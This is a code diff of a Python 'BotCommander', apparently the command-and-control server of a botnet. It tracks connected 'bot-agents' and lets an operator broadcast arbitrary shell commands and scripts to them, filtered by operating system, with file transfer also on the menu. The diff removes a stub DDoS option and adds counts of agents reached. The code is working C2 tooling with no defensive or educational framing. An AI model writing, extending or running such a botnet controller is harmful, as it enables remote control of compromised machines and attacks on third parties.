@@ -1,8 +1,8 @@
 import os
 import json
 import asyncio
-from pathlib import Path
 import configparser
+from pathlib import Path
 from logger import CoreLogger
 from socket import socket, AF_INET, SOCK_STREAM
 
@@ -31,6 +31,8 @@ def load_conf():
 class BotCommander:
     def __init__(self, host, port, offline_tout, cmd_tout):
         self.uuids = {}
+        self.sent = 0
+        self.fail = 0
         self.host = host
         self.port = port
         self.cmd_tout = cmd_tout
@@ -50,7 +52,6 @@ class BotCommander:
         2) Execute script
         3) Download File
         4) Upload File
-        5) Perform DDOS attack         
         ''')
 
     @staticmethod
@@ -65,14 +66,6 @@ class BotCommander:
         only to those online bot-agents running on the chosen OS type command
         5) Go back to previous menu
         """)
-
-    def __print_shell_notes(self):
-        print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid "
-              "one, if you insert an invalid one however you will just get the output and error for that command"
-              " sent back by bot-agent, this note is just FYI.")
-        print(f"The current timeout value for the commands to run on agents equal to {self.cmd_tout} seconds, this"
-              f" can be changed in commander.ini or right now. If you change it now it will be updated with the"
-              f" value from commander.ini when commander is restarted.")
 
     @staticmethod
     def __print_script_help():
@@ -106,10 +99,62 @@ class BotCommander:
         if os.path.isfile(path_to_check):
             return True
 
+    @staticmethod
+    def __json_deserialize(data, addr, uuid):
+        try:
+            json_item = json.loads(data.decode("utf-8"))
+        except Exception as err:
+            logger.core.error(f"Unexpected error when decoding getHostInfoReply from bot-agent {addr}-{uuid}: {err}.")
+            return False
+        return json_item
+
+    @staticmethod
+    def __json_serialize(data, message):
+        try:
+            payload = (json.dumps(data) + "\n").encode("utf-8")
+        except Exception as err:
+            logger.core.error(f"Unexpected error while serializing {message} message: {err}")
+            return False
+        return payload
+
+    @staticmethod
+    def __print_shell_note():
+        print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid "
+              "one, if you insert an invalid one however you will just get the output and error for that command"
+              " sent back by bot-agent, this note is just FYI.")
+
+    def __print_timeout_note(self):
+        print(f"The current timeout value for the commands to run on agents equal to {self.cmd_tout} seconds, this"
+              f" can be changed in commander.ini or right now. If you change it now it will be updated with the"
+              f" value from commander.ini when commander is restarted.")
+
+    async def __timeout_choice(self):
+        msg = "Do you wish to change timeout value? [Y/N]: "
+        choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+        match choice:
+            case "Y":
+                msg = "Please specify a new value for timeout of commands in seconds: "
+                value = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+                try:
+                    val = int(value)
+                except ValueError:
+                    print("You have not inserted a digit, please insert a digit.")
+                    await self.__timeout_choice()
+                except Exception as err:
+                    print(
+                        f"An unexpected exception occurred while processing your choice. Please retry"
+                        f" This is the error: {err}")
+                self.cmd_tout = val
+            case "N":
+                pass
+            case _:
+                print("Please insert Y or N...")
+                await self.__timeout_choice()
+
     async def __process_user_input(self):
         while True:
             self.__print_help()
-            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
+            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
             val = self.__check_if_number(choice)
             if not val:
@@ -124,8 +169,6 @@ class BotCommander:
                     pass
                 case 4:
                     pass
-                case 5:
-                    self.__perform_ddos()
                 case _:
                     print("Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5")
 
@@ -158,33 +201,15 @@ class BotCommander:
                     print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
                     self.__print_cmd_options()
                     continue
-            self.__print_shell_notes()
-            msg = "Do you wish to change timeout value? [Y/N]: "
-            choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
-            match choice:
-                case "Y":
-                    msg = "Please specify a new value for timeout of commands in seconds: "
-                    value = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
-                    try:
-                        val = int(value)
-                    except ValueError:
-                        print("You have not inserted a digit, please insert a digit.")
-                        continue
-                    except Exception as err:
-                        print(
-                            f"An unexpected exception occurred while processing your choice. Please retry"
-                            f" This is the error: {err}")
-                    self.cmd_tout = val
-                case "N":
-                    pass
-                case _:
-                    print("Please insert Y or N...")
-                    continue
+            self.__print_shell_note()
+            self.__print_timeout_note()
+            await self.__timeout_choice()
             while True:
                 msg = "Please insert the command you want to send to bot-agents: "
                 cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
                 if cmd:
                     await self.__schedule_command("exeCommand", cmd_filter, cmd)
+                    print(f"Command {cmd} was successfully sent to {self.sent} agents and failed to send for {self.fail} agents")
                     msg = "Do you wish to run another command using the same filter? Y/N: "
                     choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
                     match choice:
@@ -201,6 +226,8 @@ class BotCommander:
                     continue
 
     async def __schedule_command(self, command, cmd_filter, *args):
+        self.sent = 0
+        self.fail = 0
         payload = self.__json_builder(command, *args)
         if cmd_filter:
             for uuid in self.uuids:
@@ -216,9 +243,11 @@ class BotCommander:
             logger.core.debug(f'Sending payload {payload} to bot-agent {self.uuids[uuid]["hostname"]}:'
                               f'{self.uuids[uuid]["addr"]}')
             self.uuids[uuid]["writer"].write(payload)
+            self.sent += 1
         except Exception as err:
             logger.core.error(f'Unexpected exception when writing stream {payload.decode("utf-8")} to bot-agent'
                               f' {self.uuids.get(uuid)}:{self.uuids[uuid]["addr"]} - {err}')
+            self.fail += 1
 
     async def __exec_script(self):
         while True:
@@ -247,6 +276,8 @@ class BotCommander:
             await self.__schedule_script(script_type, cmd_filter)
 
     async def __schedule_script(self, script_type, cmd_filter):
+        self.__print_timeout_note()
+        await self.__timeout_choice()
         while True:
             msg = f"NOTE: Commander will not check if the file specified by you is a valid {script_type} script.\n"\
                   f"Please insert absolute path for the {script_type} script which you want to send to bot-agents: "
@@ -257,6 +288,7 @@ class BotCommander:
             with open(path_to_script, 'r') as fh:
                 data = fh.read()
             await self.__schedule_command("exeScript", cmd_filter, data, script_type, path_to_script)
+            print(f"Script {path_to_script} was successfully sent to {self.sent} agents and failed to send for {self.fail} agents")
             msg = "Do you wish to send another script using the same options? [Y/N] "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
             match choice:
@@ -266,9 +298,6 @@ class BotCommander:
                     break
                 case _:
                     "Please choose from Y and N next time..."
-
-    def __perform_ddos(self):
-        pass
 
     async def __read_buffer(self, reader, addr):
         buffer = await self.__read_line(reader, addr)
@@ -313,13 +342,13 @@ class BotCommander:
                     if self.__process_input_stream(json_item, addr, reader, writer, uuid):
                         continue
                     else:
-                        logger.core.error(f"Processing input stream from bot-agent {uuid}-{addr} has failed. Closing "
+                        logger.core.error(f"Processing input stream from bot-agent {addr}-{uuid} has failed. Closing "
                                           f"connection and setting agent to offline")
                         self.uuids[uuid]["online"] = False
                         writer.close()
                         return
             else:
-                logger.core.error(f"EOF received reading input stream from bot-agent {uuid}-{addr}. Closing connection "
+                logger.core.error(f"EOF received reading input stream from bot-agent {addr}-{uuid}. Closing connection "
                                   f"and setting agent to offline")
                 self.uuids[uuid]["online"] = False
                 writer.close()
@@ -343,16 +372,16 @@ class BotCommander:
                     payload = self.__json_builder("botHostInfoReply")
                     if payload:
                         try:
-                            logger.core.debug(f'Sending botHostInfoReply to bot-agent {agent_uuid}-{addr}')
+                            logger.core.debug(f'Sending botHostInfoReply to bot-agent {addr}-{agent_uuid}')
                             writer.write(payload)
                         except Exception as err:
                             logger.core.error(f'Unexpected error when sending botHostInfoReply to bot-agent '
-                                              f'{agent_uuid}-{addr}: {err}. Closing connection, set agent to offline.')
+                                              f'{addr}-{agent_uuid}: {err}. Closing connection, set agent to offline.')
                             self.uuids.get(agent_uuid)["online"] = False
                             return
                         return agent_uuid
                     else:
-                        logger.core.error(f"Closing connection of bot-agent {agent_uuid}:{addr} as adding process was"
+                        logger.core.error(f"Closing connection of bot-agent {addr}:{agent_uuid} as adding process was"
                                           f" not successfully completed. Closing connection, set agent to offline")
                         self.uuids.get(agent_uuid)["online"] = False
                         return
@@ -366,7 +395,7 @@ class BotCommander:
 
     def __process_input_stream(self, json_item, addr, reader, writer, uuid_in=None):
         logger.core.debug(f"Deserializing {json_item} received from bot-agent {addr}-{uuid_in}")
-        json_msg = self.__json_deserialize(json_item, addr)
+        json_msg = self.__json_deserialize(json_item, addr, uuid_in)
         if not json_msg:
             return False
         message = json_msg.get("message")
@@ -392,10 +421,10 @@ class BotCommander:
                 payload = self.__json_builder("botHelloReply")
                 if payload:
                     try:
-                        logger.core.debug(f"Sending botHelloReply to bot-agent {uuid_in}-{addr}")
+                        logger.core.debug(f"Sending botHelloReply to bot-agent {addr}-{uuid_in}")
                         writer.write(payload)
                     except Exception as err:
-                        logger.core.error(f"Unexpected exception sending botHelloReply to bot-agent {uuid_in}-{addr}: {err}")
+                        logger.core.error(f"Unexpected exception sending botHelloReply to bot-agent {addr}-{uuid_in}: {err}")
                         return False
                     return True
                 else:
@@ -413,24 +442,6 @@ class BotCommander:
                                   f"{message}, commander cannot interpret this. Closing connection ")
                 return False
 
-    @staticmethod
-    def __json_deserialize(data, addr):
-        try:
-            json_item = json.loads(data.decode("utf-8"))
-        except Exception as err:
-            logger.core.error(f"Unexpected error when decoding getHostInfoReply from bot-agent {addr}: {err}.")
-            return False
-        return json_item
-
-    @staticmethod
-    def __json_serialize(data, message):
-        try:
-            payload = (json.dumps(data) + "\n").encode("utf-8")
-        except Exception as err:
-            logger.core.error(f"Unexpected error while serializing {message} message: {err}")
-            return False
-        return payload
-
     def __json_builder(self, message, *args):
         if message in ["botHostInfoReply", "botHelloReply"]:
             d = {"message": f"{message}"}
@@ -445,16 +456,6 @@ class BotCommander:
             return False
         payload = self.__json_serialize(d, message)
         return payload
-
-    @staticmethod
-    def __safe_dict_double_get(d, key_1, key_2):
-        try:
-            return d.get(key_1).get(key_2)
-        except AttributeError:
-            logger.core.error(f"Commander failed to fetch {key_2} for bot-agent with UUID {key_1} because this UUID"
-                              f"does not exist in DB")
-        except Exception as err:
-            logger.core.error(f"Unexpected error when commander tried to fetch {key_2} for bot-agent with UUID {key_1}: {err}")
 
     async def __server_run(self):
         server = await asyncio.start_server(self.__handle_agent, self.host, self.port)
